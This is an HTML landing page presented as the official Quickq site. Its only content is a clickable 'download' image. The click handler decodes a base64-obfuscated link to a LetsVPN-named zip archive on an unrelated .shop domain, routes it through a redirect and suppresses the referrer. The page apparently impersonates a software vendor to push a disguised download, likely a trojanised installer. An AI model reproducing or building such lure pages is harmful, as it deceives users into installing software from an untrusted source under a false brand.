<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Quickq官网</title>
  <meta name="referrer" content="no-referrer"> <!-- 禁止传递来源 -->
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      overflow-y: scroll;
    }
    .container {
      width: 100%;
      margin: 0 auto;
      text-align: center;
    }
    #mainImage {
      width: 100%;
      height: auto;
      cursor: pointer;
      display: block;
    }
  </style>
</head>
<body>
  <div class="container">
    <img
      id="mainImage"
      src="pv.webp"
      alt="去下载"
      onclick="gotoDownload()"
    >
  </div>

  <script>
    function gotoDownload() {
      const encodedUrl = "aHR0cHM6Ly9zb2Z0LmRvd25vc3Mtd2luMDIuc2hvcC9MZXRzVlAxLUxlaXNqcnl1dC56aXA=";
      const jumpUrl = "down/?c=" + encodeURIComponent(encodedUrl);
      const a = document.createElement("a");
      a.href = jumpUrl;
      a.rel = "noreferrer"; 
      a.target = "_blank"; 
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    }
  </script>
</body>
</html>
